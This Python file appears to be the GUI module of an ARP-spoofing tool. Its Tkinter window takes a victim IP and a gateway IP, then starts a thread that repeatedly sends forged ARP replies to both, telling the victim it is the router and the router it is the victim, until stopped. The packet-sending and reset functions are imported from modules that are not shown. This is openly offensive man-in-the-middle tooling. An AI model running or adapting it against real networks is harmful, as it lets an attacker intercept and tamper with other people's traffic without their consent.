import datetime
import threading
import time
from tkinter import *
from tkinter.ttk import Treeview
from controller.reroute import reset
from controller.send import send_packet
from spoofer.InputValidate import IP_VALIDATOR
from spoofer.add import Add
from spoofer.columns import spoof_table_columns
from spoofer.tableHeaders import Headers
from utils.debug import dbg, INFO, SUCCESS, WARNING
from utils.tooltip import ToolTip
import pyperclip

SPOOF = "Spoof"     # acronym (to make change name easier)
SPOOFER = "Spoofer" # acronym (to make change name easier)

start_sym = "start"
stop_sym = "stop"
spoofed = {}
spoofer_delay = 2
spoofer_packets = 2

def Spoofer():
    dbg("Loading spoofer..", INFO)

    window = Toplevel()
    window.title("Spoofer")

    menubar = Menu(tearoff=False)
    spoofer_menu = Menu(tearoff=False)
    menubar.add_cascade(label="Spoofer", menu=spoofer_menu)

    interactions_frame = Frame(window)
    interactions_frame.pack(side='bottom', fill='x', padx=5, pady=5)

    Label(interactions_frame, text="TARGET (SOURCE):", foreground="red").pack(padx=3, side='left')

    register_ip_src = window.register(IP_VALIDATOR)
    new_src_ip = Entry(interactions_frame, validate="key", validatecommand=(register_ip_src, '%P'), background="cyan",
                       foreground="black")
    ToolTip(new_src_ip, "Packet source [SRC]~[DST].")
    new_src_ip.pack(side='left', expand=True, fill='x')
    Label(interactions_frame, text="GATEWAY (DESTINATION):", foreground="red").pack(padx=3, side='left')

    register_ip_dest = window.register(IP_VALIDATOR)
    new_dest_ip = Entry(interactions_frame, validate="key", validatecommand=(register_ip_dest, '%P'), background="cyan",
                        foreground="black")
    ToolTip(new_dest_ip, "Packet destination [DST]~[SRC].")
    new_dest_ip.pack(side='left', expand=True, fill='x')

    add_btn = Button(interactions_frame, text="Add", cursor="hand2", takefocus=False, command=lambda: Add(table=spoof_table, source=new_src_ip, destination=new_dest_ip, data=spoofed, start_symbol=start_sym))
    add_btn.pack(side='left', padx=5, pady=5, fill='x')
    ToolTip(add_btn, "Add new target client to tables.")
    spoofer_menu.add_command(label="add", command=lambda: Add(table=spoof_table, source=new_src_ip, destination=new_dest_ip, data=spoofed, start_symbol=start_sym))

    table_frame = Frame(window)
    table_frame.pack(side='bottom', fill='both', expand=True, padx=5, pady=5)

    spoof_result_SBY = Scrollbar(table_frame, orient="vertical")
    spoof_result_SBY.pack(side='right', fill='y')

    spoof_result_SBX = Scrollbar(table_frame, orient="horizontal")
    spoof_result_SBX.pack(side='bottom', fill='x')

    spoof_table = Treeview(table_frame, columns=tuple(spoof_table_columns.keys()), show="headings",
                           selectmode="none", yscrollcommand=spoof_result_SBY.set,
                           xscrollcommand=spoof_result_SBX.set)

    def Copy_row(event):
        x = event.x
        y = event.y
        if spoof_table.identify_region(x=x, y=y) == "cell":
            try:
                column_num = spoof_table.identify_column(x=x)  # as #0, #1, #2
                column_data = spoof_table.column(
                    column=column_num)  # as {'width': 512, 'minwidth': 20, 'stretch': 1, 'anchor': 'center', 'id': 'DATA'}
                column_index = list(spoof_table_columns.keys()).index(column_data['id'])
                item_id = spoof_table.identify_row(y=y)
                pyperclip.copy(spoof_table.item(item=item_id)['values'][column_index])
            except Exception:
                pass

    spoof_table.bind("<Button-2>", Copy_row)

    def spoof(item):
        """
        ARP tables have a TTL in computers and routers
        To stay fooling the victim and the router, PS
        need to keep sending ARP responses.
        """

        src = spoofed[item]['info'][0]
        dest = spoofed[item]['info'][1]
        dbg(f"{SPOOFER} started '%s > %s'" % (src, dest), INFO)
        dbg(f"{SPOOFER} started '%s > %s'" % (dest, src), INFO)

        try:
            sent = spoofed[item]['count']
            while spoofed[item]['status']:
                send_packet(src, dest, count=spoofer_packets)  # Tell the victim that we are the router
                send_packet(dest, src, count=spoofer_packets)  # Tell the router that we are the victim

                sent += spoofer_packets
                at = datetime.datetime.now().strftime("%I:%M:%S %p")
                spoof_table.set(item=item, column=list(spoof_table_columns.keys()).index("SENT"), value=str(sent))
                spoof_table.set(item=item, column=list(spoof_table_columns.keys()).index("LAST"), value=at)
                time.sleep(spoofer_delay)
        except Exception:
            pass
        Stopped(item=item)
        dbg("Resetting '%s > %s'" % (src, dest), WARNING)
        reset(src, dest)
        dbg("Resetting '%s > %s'" % (dest, src), WARNING)
        reset(dest, src)

    def Stopped(item):
        status_index = list(spoof_table_columns.keys()).index("STATUS")
        spoof_table.set(item=item, column=status_index, value=start_sym)
        spoof_table.item(item=item, tags="stopped")
        spoof_table.set(item=item, column=list(spoof_table_columns.keys()).index("LAST"),
                        value=datetime.datetime.now().strftime("%I:%M:%S %p"))

    def Started(item):
        status_index = list(spoof_table_columns.keys()).index("STATUS")
        spoof_table.set(item=item, column=status_index, value=stop_sym)
        spoof_table.item(item=item, tags="started")
        spoof_table.set(item=item, column=list(spoof_table_columns.keys()).index("LAST"),
                        value=datetime.datetime.now().strftime("%I:%M:%S %p"))

    def Action(e):
        try:
            rowID = spoof_table.identify('item', e.x, e.y)
            columnNum = spoof_table.identify('column', e.x, e.y)
            status_index = list(spoof_table_columns.keys()).index("STATUS") + 1
            isAction = (int(columnNum[1:]) == status_index)
            if isAction is True and rowID in spoof_table.get_children():
                status = spoof_table.item(item=rowID)['values'][status_index - 1]
                src = spoofed[rowID]['info'][0]
                dest = spoofed[rowID]['info'][1]

                if status == start_sym:
                    dbg("Start spoofing '%s > %s'" % (src, dest), INFO)
                    dbg("Start spoofing '%s > %s'" % (dest, src), INFO)
                    Started(item=rowID)
                    spoofed[rowID]['status'] = True
                    threading.Thread(target=spoof, args=(rowID,)).start()
                elif status == stop_sym:
                    dbg("Stop spoofing '%s > %s'" % (src, dest), SUCCESS)
                    dbg("Stop spoofing '%s > %s'" % (dest, src), SUCCESS)
                    spoofed[rowID]['status'] = False
                    Stopped(item=rowID)
                return 'break'  # to prevent selection when pressed on action
        except Exception:
            pass

    spoof_table.bind("<Button-1>", Action)

    spoof_table.tag_bind(tagname="stopped")
    spoof_table.tag_configure(tagname="stopped", foreground="red")
    spoof_table.tag_bind(tagname="started")
    spoof_table.tag_configure(tagname="started", foreground="green")

    spoof_table.pack(fill='both', expand=True)
    spoof_result_SBY.config(command=spoof_table.yview)
    spoof_result_SBX.config(command=spoof_table.xview)
    Headers(table=spoof_table, headers=spoof_table_columns)

    dbg(f"{SPOOFER} loaded.", SUCCESS)

    window.config(menu=menubar)
    window.mainloop()